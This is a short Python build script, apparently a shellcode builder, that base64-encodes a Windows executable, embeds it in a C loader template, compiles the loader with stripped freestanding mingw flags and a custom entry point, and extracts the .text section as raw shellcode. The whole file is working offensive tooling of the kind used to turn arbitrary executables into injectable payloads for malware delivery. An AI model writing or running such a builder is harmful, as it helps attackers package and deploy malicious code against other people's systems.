import base64
import sys
import os
import subprocess

def build(payload_path, loader_c, output_bin):
    with open(payload_path, "rb") as f:
        encoded_payload = base64.b64encode(f.read()).decode()

    full_payload_str = f"PLD:{encoded_payload}---"
    with open(loader_c, "r") as f:
        c_content = f.read()

    placeholder = 'const char payload_b64[] = "---PAYLOAD_PLACEHOLDER---";'
    new_c_content = c_content.replace(placeholder, f'const char payload_b64[] = "{full_payload_str}";')

    with open("loader_final.c", "w") as f:
        f.write(new_c_content)

    loader_exe = "loader_temp.exe"
    # Added -e Entry to make it the entry point
    compile_cmd = [
        "x86_64-w64-mingw32-gcc", "loader_final.c", "-o", loader_exe,
        "-nostdlib", "-ffreestanding", "-e", "Entry",
        "-fno-stack-protector", "-fno-common", "-fno-asynchronous-unwind-tables",
        "-Os", "-s"
    ]
    subprocess.run(compile_cmd, check=True)

    extract_cmd = ["x86_64-w64-mingw32-objcopy", "-O", "binary", "--only-section=.text", loader_exe, output_bin]
    subprocess.run(extract_cmd, check=True)

    os.remove(loader_exe)
    os.remove("loader_final.c")
    print(f"Successfully created final shellcode: {output_bin} ({os.path.getsize(output_bin)} bytes)")

if __name__ == "__main__":
    if len(sys.argv) < 4:
        print("Usage: python3 builder.py <payload.exe> <loader.c> <output.bin>")
        sys.exit(1)
    build(sys.argv[1], sys.argv[2], sys.argv[3])
